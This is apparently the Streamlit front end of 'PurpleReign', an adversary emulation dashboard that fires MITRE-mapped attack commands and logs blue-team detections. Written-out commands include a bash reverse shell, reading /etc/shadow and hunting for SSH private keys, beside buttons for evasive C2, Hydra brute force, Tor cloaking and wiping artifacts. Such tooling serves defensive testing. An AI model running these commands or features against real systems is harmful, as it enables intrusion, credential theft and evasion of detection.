import streamlit as st
import pandas as pd
import time
import threading
from core.red import RedTeamExecutor
from core.blue import BlueTeamObserver
from core.analyst import StrategicAnalyst
from modules.exploit_tools import ExploitTools
from modules.osint import OSINTProfiler
from core.drm import LicenseManager
from core.predator import PredatorEngine

# --- DRM LOCK ---
# This must run before anything else.
LicenseManager().validate_license()

# Initialize session state
if 'red_team' not in st.session_state:
    st.session_state['red_team'] = RedTeamExecutor()
if 'blue_team' not in st.session_state:
    st.session_state['blue_team'] = BlueTeamObserver()
if 'exploit_tools' not in st.session_state:
    st.session_state['exploit_tools'] = ExploitTools()
if 'osint' not in st.session_state:
    st.session_state['osint'] = OSINTProfiler()
if 'analyst' not in st.session_state:
    st.session_state['analyst'] = StrategicAnalyst()
if 'predator' not in st.session_state:
    st.session_state['predator'] = PredatorEngine(st.session_state['red_team'], st.session_state['blue_team'])
if 'simulation_running' not in st.session_state:
    st.session_state['simulation_running'] = False
if 'logs' not in st.session_state:
    st.session_state['logs'] = []
if 'legal_agreed' not in st.session_state:
    st.session_state['legal_agreed'] = False

st.set_page_config(page_title="PurpleReign Command Center", layout="wide")

# --- LEGAL INTERLOCK ---
if not st.session_state['legal_agreed']:
    st.title("⚠️ RESTRICTED ACCESS: AUTHORIZED USE ONLY")
    st.error("This system simulates dangerous cyberattacks. Unauthorized use is a criminal offense.")
    
    st.markdown("""
    ### End User License Agreement (EULA)
    By accessing **PurpleReign**, you certify under penalty of perjury that:
    
    1.  **Ownership:** You own the systems you are testing, or have explicit written permission from the owner.
    2.  **Liability:** The developers are not liable for damage, data loss, or system instability caused by this tool.
    3.  **Logging:** All actions performed on this platform are logged and auditable.
    4.  **Scope:** You will not target public networks, critical infrastructure, or third-party systems.
    
    **Violation of these terms may result in prosecution under the Computer Fraud and Abuse Act (CFAA).**
    """)
    
    if st.button("I AGREE - UNLOCK SYSTEM"):
        st.session_state['legal_agreed'] = True
        st.experimental_rerun()
    
    st.stop() # Halts execution here until agreed

st.title("💜 PurpleReign: Adversary Emulation Platform")

# --- SIDEBAR ---
st.sidebar.header("Operations Center")
mode = st.sidebar.radio("Mode", ["Live Simulation", "Post-Mortem Report"])
use_tor = st.sidebar.checkbox("Cloak Mode (Tor Network)")
stealth_mode = st.sidebar.checkbox("Stealth Mode (Low & Slow)")

st.sidebar.markdown("---")
st.sidebar.subheader("🛡️ Defense System")

# OSINT Tool
st.sidebar.markdown("---")
st.sidebar.subheader("🕵️ Active Recon")
target_ip = st.sidebar.text_input("Target IP", "217.217.250.184")
if st.sidebar.button("Run Intel Probe"):
    with st.spinner(f"Profiling {target_ip}..."):
        report = st.session_state['osint'].analyze_ip(target_ip)
        st.sidebar.success("Profile Built.")
        
        # Display Report
        st.info(f"**Target:** {report['target']}")
        st.write(f"**Origin:** {report['geo']['city']}, {report['geo']['country']}")
        st.write(f"**ISP:** {report['geo']['isp']}")
        st.write(f"**Threat Level:** {report['threat_level']}")
        st.json(report)

# Integrity Check
if 'exploit_tools' in st.session_state:
    status, msg = st.session_state['exploit_tools'].defense.check_integrity()
    if status == "COMPROMISED":
        st.sidebar.error(f"🚨 {status}")
        st.sidebar.caption(msg)
    else:
        st.sidebar.success(f"✅ {status}")

    if st.sidebar.button("🔥 PANIC BUTTON"):
        st.session_state['exploit_tools'].defense.emergency_cleanup()
        st.sidebar.warning("Artifacts Wiped.")

# --- MAIN DASHBOARD ---
if mode == "Live Simulation":
    col1, col2 = st.columns([1, 2])
    
    with col1:
        st.subheader("🔴 Red Team Controls")
        
        if st.button("Start Blue Team Monitoring"):
            st.session_state['simulation_running'] = True
            st.session_state['blue_team'].start()
            st.success("Blue Team Sensors Active")

        if st.button("🤖 START AUTONOMOUS CAMPAIGN"):
            st.session_state['logs'].append({
                "Team": "RED", "Event": "CAMPAIGN STARTED", "Details": "Predator AI Engaged", "Timestamp": time.strftime("%H:%M:%S")
            })
            st.session_state['predator'].start_campaign()
            st.success("Campaign Complete.")

        st.markdown("### Attack Scenarios")
        
        if st.button("Execute: Discovery (T1087)"):
            log = st.session_state['red_team'].execute_tactic("T1087", "whoami && id", "User Discovery", jitter=stealth_mode)
            st.session_state['logs'].append({
                "Team": "RED", 
                "Event": f"ATTACK: {log['tactic_id']}",
                "Details": log['command'],
                "Timestamp": time.strftime("%H:%M:%S")
            })
            if st.session_state['simulation_running']:
                detections = st.session_state['blue_team'].scan_processes()
                for d in detections:
                     st.session_state['logs'].append({
                        "Team": "BLUE",
                        "Event": f"DETECTED: {d['threat']}",
                        "Details": f"PID: {d['pid']}", 
                        "Timestamp": time.strftime("%H:%M:%S")
                    })

        if st.button("Execute: Persistence (T1053)"):
            log = st.session_state['red_team'].execute_tactic("T1053", "crontab -l", "Scheduled Task Discovery", jitter=stealth_mode)
            st.session_state['logs'].append({
                "Team": "RED", 
                "Event": f"ATTACK: {log['tactic_id']}",
                "Details": log['command'],
                "Timestamp": time.strftime("%H:%M:%S")
            })
            if st.session_state['simulation_running']:
                detections = st.session_state['blue_team'].scan_processes()
                for d in detections:
                     st.session_state['logs'].append({
                        "Team": "BLUE",
                        "Event": f"DETECTED: {d['threat']}",
                        "Details": f"PID: {d['pid']}",
                        "Timestamp": time.strftime("%H:%M:%S")
                    })

        if st.button("Execute: Obfuscation (T1027)"):
            log = st.session_state['red_team'].execute_tactic("T1027", "echo 'Hello' | base64", "Base64 Obfuscation", jitter=stealth_mode)
            st.session_state['logs'].append({
                "Team": "RED", 
                "Event": f"ATTACK: {log['tactic_id']}",
                "Details": log['command'],
                "Timestamp": time.strftime("%H:%M:%S")
            })
            if st.session_state['simulation_running']:
                detections = st.session_state['blue_team'].scan_processes()
                for d in detections:
                     st.session_state['logs'].append({
                        "Team": "BLUE",
                        "Event": f"DETECTED: {d['threat']}",
                        "Details": f"PID: {d['pid']}",
                        "Timestamp": time.strftime("%H:%M:%S")
                    })

        st.markdown("### Advanced Attacks (APT)")
        
        if st.button("Execute: Credential Access (T1003)"):
            # Attempt to read protected shadow file (will likely fail permission, but generate log)
            log = st.session_state['red_team'].execute_tactic("T1003", "grep root /etc/shadow", "Dump Password Hashes", jitter=stealth_mode)
            st.session_state['logs'].append({
                "Team": "RED", 
                "Event": f"ATTACK: {log['tactic_id']}",
                "Details": log['command'],
                "Timestamp": time.strftime("%H:%M:%S")
            })
            if st.session_state['simulation_running']:
                detections = st.session_state['blue_team'].scan_processes()
                for d in detections:
                     st.session_state['logs'].append({
                        "Team": "BLUE",
                        "Event": f"DETECTED: {d['threat']}",
                        "Details": f"PID: {d['pid']}",
                        "Timestamp": time.strftime("%H:%M:%S")
                    })

        if st.button("Execute: C2 Reverse Shell (T1059)"):
            # Attempt a standard Bash TCP reverse shell (simulated connection)
            # Use 'timeout 2s' to prevent hanging the GUI if netcat isn't listening
            cmd = "timeout 2s bash -c 'bash -i >& /dev/tcp/127.0.0.1/4444 0>&1'"
            log = st.session_state['red_team'].execute_tactic("T1059", cmd, "Reverse Shell Callback")
            st.session_state['logs'].append({
                "Team": "RED", 
                "Event": f"ATTACK: {log['tactic_id']}",
                "Details": "bash -i >& /dev/tcp/127.0.0.1/4444",
                "Timestamp": time.strftime("%H:%M:%S")
            })
            if st.session_state['simulation_running']:
                detections = st.session_state['blue_team'].scan_processes()
                for d in detections:
                     st.session_state['logs'].append({
                        "Team": "BLUE",
                        "Event": f"DETECTED: {d['threat']}",
                        "Details": f"PID: {d['pid']}",
                        "Timestamp": time.strftime("%H:%M:%S")
                    })

        if st.button("Execute: Stealth Python C2 (Evasion)"):
            result = st.session_state['exploit_tools'].run_stealth_python_c2()
            st.session_state['logs'].append({
                "Team": "RED", 
                "Event": "ATTACK: T1059 (Python Evasion)",
                "Details": "Polyglot Payload (Bypasses Signatures)",
                "Timestamp": time.strftime("%H:%M:%S")
            })
            if st.session_state['simulation_running']:
                detections = st.session_state['blue_team'].scan_processes()
                if detections:
                    for d in detections:
                         st.session_state['logs'].append({
                            "Team": "BLUE", "Event": f"DETECTED: {d['threat']}", "Details": f"PID: {d['pid']}", "Timestamp": time.strftime("%H:%M:%S")
                        })
                else:
                     st.session_state['logs'].append({
                        "Team": "RED", "Event": "SUCCESS: Evasion Successful", "Details": "No Blue Team Alerts Triggered", "Timestamp": time.strftime("%H:%M:%S")
                    })

        if st.button("Execute: Lateral Movement (T1552)"):
            # Search for SSH keys
            log = st.session_state['red_team'].execute_tactic("T1552", "find / -name id_rsa 2>/dev/null", "SSH Private Key Hunting", jitter=stealth_mode)
            st.session_state['logs'].append({
                "Team": "RED", 
                "Event": f"ATTACK: {log['tactic_id']}",
                "Details": log['command'],
                "Timestamp": time.strftime("%H:%M:%S")
            })
            if st.session_state['simulation_running']:
                detections = st.session_state['blue_team'].scan_processes()
                for d in detections:
                     st.session_state['logs'].append({
                        "Team": "BLUE",
                        "Event": f"DETECTED: {d['threat']}",
                        "Details": f"PID: {d['pid']}",
                        "Timestamp": time.strftime("%H:%M:%S")
                    })

        st.markdown("### Nuclear Options (Real Tools)")
        
        if st.button("☢️ Execute: Metasploit Port Scan"):
            result = st.session_state['exploit_tools'].run_metasploit_scan(use_tor=use_tor, stealth_mode=stealth_mode)
            st.session_state['logs'].append({
                "Team": "RED", 
                "Event": f"ATTACK: T1059 (Metasploit) - Tor: {use_tor} - Stealth: {stealth_mode}",
                "Details": f"Status: {result['status']}",
                "Timestamp": time.strftime("%H:%M:%S")
            })
            if st.session_state['simulation_running']:
                 detections = st.session_state['blue_team'].scan_processes()
                 for d in detections:
                      st.session_state['logs'].append({
                        "Team": "BLUE", "Event": f"DETECTED: {d['threat']}", "Details": f"PID: {d['pid']}", "Timestamp": time.strftime("%H:%M:%S")
                    })

        if st.button("☢️ Execute: Hydra Brute Force (SSH)"):
            result = st.session_state['exploit_tools'].run_hydra_brute(use_tor=use_tor, stealth_mode=stealth_mode)
            st.session_state['logs'].append({
                "Team": "RED", 
                "Event": f"ATTACK: T1110 (Hydra) - Tor: {use_tor} - Stealth: {stealth_mode}",
                "Details": f"Status: {result['status']}",
                "Timestamp": time.strftime("%H:%M:%S")
            })
            if st.session_state['simulation_running']:
                 detections = st.session_state['blue_team'].scan_processes()
                 for d in detections:
                      st.session_state['logs'].append({
                        "Team": "BLUE", "Event": f"DETECTED: {d['threat']}", "Details": f"PID: {d['pid']}", "Timestamp": time.strftime("%H:%M:%S")
                    })
        if st.button("☢️ Execute: SET Phishing Campaign"):
            # Simulates creating a SET payload and hosting a fake site
            cmd = "python3 -m http.server 8080 & echo 'Phishing Site Live'"
            st.session_state['red_team'].execute_tactic("T1566", cmd, "Phishing Simulation")
            st.session_state['logs'].append({
                "Team": "RED", 
                "Event": "ATTACK: T1566 (SET Simulation)",
                "Details": "Hosting Fake Login Page on Port 8080",
                "Timestamp": time.strftime("%H:%M:%S")
            })
            if st.session_state['simulation_running']:
                 detections = st.session_state['blue_team'].scan_processes()
                 for d in detections:
                      st.session_state['logs'].append({
                        "Team": "BLUE", "Event": f"DETECTED: {d['threat']}", "Details": f"PID: {d['pid']}", "Timestamp": time.strftime("%H:%M:%S")
                    })

        if st.button("🛑 Stop Simulation"):
            st.session_state['simulation_running'] = False
            st.warning("Simulation Stopped")

    with col2:
        st.subheader("📝 Live Event Log")
        if st.session_state['logs']:
            df = pd.DataFrame(st.session_state['logs'])
            
            # Simple color coding using map/applymap
            def color_team(val):
                color = 'red' if val == 'RED' else 'blue'
                return f'color: {color}; font-weight: bold'
            
            try:
                # Try applying style (might fail depending on pandas version in environment)
                styled_df = df.style.map(color_team, subset=['Team'])
                st.dataframe(styled_df, use_container_width=True)
            except:
                # Fallback to plain dataframe
                st.dataframe(df, use_container_width=True)
        else:
            st.info("No events yet. Start Blue Team and launch attacks.")

elif mode == "Post-Mortem Report":
    st.subheader("📊 Simulation Report")
    
    # Calculate Metrics from logs
    red_logs = [x for x in st.session_state['logs'] if x['Team'] == 'RED']
    blue_logs = [x for x in st.session_state['logs'] if x['Team'] == 'BLUE']
    
    red_count = len(red_logs)
    blue_count = len(blue_logs)
    
    col1, col2, col3 = st.columns(3)
    col1.metric("Total Attacks", red_count)
    col2.metric("Total Detections", blue_count)
    
    # Simple detection rate logic (assuming 1 detection per attack for simplicity)
    detection_rate = (blue_count / red_count * 100) if red_count > 0 else 0
    if detection_rate > 100: detection_rate = 100 # Cap at 100%
    
    col3.metric("Detection Rate", f"{detection_rate:.1f}%")
    
    st.markdown("---")
    if detection_rate < 100:
        st.error(f"⚠️ Security Gaps Found! Detection Rate: {detection_rate:.1f}%")
        st.markdown("### Recommendations")
        st.markdown("- **Discovery (T1087):** Enable auditing for `whoami` and `id` commands.")
        st.markdown("- **Persistence (T1053):** Monitor `crontab` execution.")
        st.markdown("- **Obfuscation (T1027):** Use Sigma rules to detect base64 encoding pipes.")
    else:
        st.success("✅ Perfect Defense! All attacks were detected.")

    st.markdown("---")
    st.subheader("🧠 AI Strategic Analysis")
    
    insights = st.session_state['analyst'].analyze_performance(red_logs, blue_logs)
    
    if insights:
        for insight in insights:
            with st.expander(f"{insight['Tactic']} - {insight['Status']}"):
                st.markdown(f"**Strategic Intent (Why):**\n{insight['Intent']}")
                st.markdown(f"**AI Learning (How to Improve):**\n{insight['Lesson']}")
    else:
        st.info("No attack data available for analysis. Run a simulation first.")